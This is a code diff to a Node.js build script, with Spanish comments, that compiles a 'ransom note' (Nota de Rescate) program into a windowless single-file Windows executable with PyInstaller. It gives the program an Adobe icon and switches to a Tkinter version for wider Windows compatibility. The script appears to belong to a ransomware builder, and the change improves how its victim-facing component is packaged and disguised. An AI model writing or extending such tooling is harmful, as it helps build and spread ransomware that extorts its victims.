@@ -51,20 +51,23 @@ function runBuild(filename) {
             const iconAbsPath = path.resolve(__dirname, iconRef);
             const iconArg = fs.existsSync(iconRef) ? `--icon="${iconAbsPath}"` : '';
 
-            console.log(`   [PYTHON] Compilando Nota de Rescate (${noteName}) con Icono...`);
+            // USAR VERSION TKINTER (compatible con Windows 7/8/10/11)
+            const pyScript = fs.existsSync('interfazdeaviso_tk.py') ? 'interfazdeaviso_tk.py' : 'interfazdeaviso.py';
+            console.log(`   [PYTHON] Compilando Nota de Rescate (${noteName}) con ${pyScript}...`);
 
             // Intento 1: Usar via modulo (evita problemas de PATH)
-            execSync(`python -m PyInstaller --onefile --noconsole ${iconArg} --distpath dist --workpath build/py_work --specpath build/py_spec --name "${noteName.replace('.exe', '')}" interfazdeaviso.py`, { stdio: 'inherit' });
+            execSync(`python -m PyInstaller --onefile --noconsole ${iconArg} --distpath dist --workpath build/py_work --specpath build/py_spec --name "${noteName.replace('.exe', '')}" ${pyScript}`, { stdio: 'inherit' });
             console.log(`   [PYTHON] Nota compilada con exito.`);
         } catch (e) {
             const iconRef = 'adobe_icon.ico';
             const iconAbsPath = path.resolve(__dirname, iconRef);
             const iconArg = fs.existsSync(iconRef) ? `--icon="${iconAbsPath}"` : '';
+            const pyScript = fs.existsSync('interfazdeaviso_tk.py') ? 'interfazdeaviso_tk.py' : 'interfazdeaviso.py';
 
             console.log(`   [PYTHON] Modulo fallito. Intentando comando global 'pyinstaller'...`);
             try {
                 // Intento 2: Comando directo
-                execSync(`pyinstaller --onefile --noconsole ${iconArg} --distpath dist --workpath build/py_work --specpath build/py_spec --name "${noteName.replace('.exe', '')}" interfazdeaviso.py`, { stdio: 'inherit' });
+                execSync(`pyinstaller --onefile --noconsole ${iconArg} --distpath dist --workpath build/py_work --specpath build/py_spec --name "${noteName.replace('.exe', '')}" ${pyScript}`, { stdio: 'inherit' });
                 console.log(`   [PYTHON] Nota compilada con exito.`);
             } catch (err) {
                 console.log(`   [PYTHON] Advertencia: No se pudo compilar la nota.`);
